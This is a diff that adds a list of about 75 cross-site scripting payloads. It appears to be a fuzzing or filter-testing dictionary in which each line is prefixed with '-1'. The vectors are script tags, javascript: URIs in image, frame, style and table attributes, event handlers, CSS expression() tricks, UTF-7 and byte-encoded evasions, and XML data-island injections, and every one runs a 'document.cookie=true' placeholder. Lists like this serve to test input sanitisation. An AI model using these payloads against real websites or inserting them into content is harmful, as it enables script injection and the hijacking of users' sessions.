@@ -1,0 +1,75 @@
+-1<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+-1<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+-1<SCRIPT>document.cookie=true;</SCRIPT>
+-1<IMG SRC="jav ascript:document.cookie=true;">
+-1<IMG SRC="javascript:document.cookie=true;">
+-1<IMG SRC="  javascript:document.cookie=true;">
+-1<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
+-1<SCRIPT>document.cookie=true;//<</SCRIPT>
+-1<SCRIPT <B>document.cookie=true;</SCRIPT>
+-1<IMG SRC="javascript:document.cookie=true;">
+-1<iframe src="javascript:document.cookie=true;> 
+-1<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT> 
+-1</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+-1<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+-1<BODY BACKGROUND="javascript:document.cookie=true;">
+-1<BODY ONLOAD=document.cookie=true;>
+-1<IMG DYNSRC="javascript:document.cookie=true;">
+-1<IMG LOWSRC="javascript:document.cookie=true;">
+-1<BGSOUND SRC="javascript:document.cookie=true;">
+-1<BR SIZE="&{document.cookie=true}">
+-1<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+-1<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+-1<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>CrossSiteScripting 
+-1¼script¾document.cookie=true;¼/script¾ 
+-1<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+-1<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+-1<TABLE BACKGROUND="javascript:document.cookie=true;">
+-1<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+-1<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+-1<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
+-1<DIV STYLE="width: expression(document.cookie=true);">
+-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+-1<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)">
+-1<CrossSiteScripting STYLE="CrossSiteScripting:expression(document.cookie=true)"> 
+-1exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'> 
+-1<STYLE TYPE="text/javascript">document.cookie=true;</STYLE> 
+-1<STYLE>.CrossSiteScripting{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=CrossSiteScripting></A> 
+-1<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE> 
+-1<SCRIPT>document.cookie=true;</SCRIPT>
+-1<BASE HREF="javascript:document.cookie=true;//">
+-1<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
+-1<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+-1<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+-1<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
+-1<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
+-1<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
+-1<a href="javascript#document.cookie=true;">
+-1<div onmouseover="document.cookie=true;">
+-1<img src="javascript:document.cookie=true;">
+-1<img dynsrc="javascript:document.cookie=true;">
+-1<input type="image" dynsrc="javascript:document.cookie=true;">
+-1<bgsound src="javascript:document.cookie=true;">
+-1&<script>document.cookie=true;</script> 
+-1&{document.cookie=true;}; 
+-1<img src=&{document.cookie=true;};> 
+-1<link rel="stylesheet" href="javascript:document.cookie=true;"> 
+-1<img src="mocha:document.cookie=true;"> 
+-1<img src="livescript:document.cookie=true;"> 
+-1<a href="about:<script>document.cookie=true;</script>"> 
+-1<body onload="document.cookie=true;"> 
+-1<div style="background-image: url(javascript:document.cookie=true;);"> 
+-1<div style="behaviour: url([link to code]);"> 
+-1<div style="binding: url([link to code]);"> 
+-1<div style="width: expression(document.cookie=true;);">
+-1<style type="text/javascript">document.cookie=true;</style>
+-1<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+-1<style><!--</style><script>document.cookie=true;//--></script>
+-1<<script>document.cookie=true;</script>
+-1<script>document.cookie=true;//--></script>
+-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+-1<img src="blah"onmouseover="document.cookie=true;">
+-1<img src="blah>" onmouseover="document.cookie=true;">
+-1<xml src="javascript:document.cookie=true;">
+-1<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+-1<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
